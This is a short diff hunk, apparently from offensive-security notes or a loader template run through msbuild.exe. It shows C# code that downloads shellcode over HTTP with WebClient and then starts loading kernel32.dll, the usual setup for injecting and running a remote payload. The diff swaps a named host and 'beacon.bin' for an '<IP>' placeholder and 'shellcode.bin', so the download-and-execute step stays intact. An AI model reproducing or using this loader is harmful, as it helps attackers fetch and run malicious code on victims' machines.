@@ -503,8 +503,8 @@ msbuild.exe <FILE>
                     byte[] shellcode;
                     using (var client = new WebClient())
                     {
-                        client.BaseAddress = "http://nickelviper.com";
-                        shellcode = client.DownloadData("beacon.bin");
+                        client.BaseAddress = "http://<IP>";
+                        shellcode = client.DownloadData("shellcode.bin");
                     }
       
                     var hKernel = LoadLibrary("kernel32.dll");
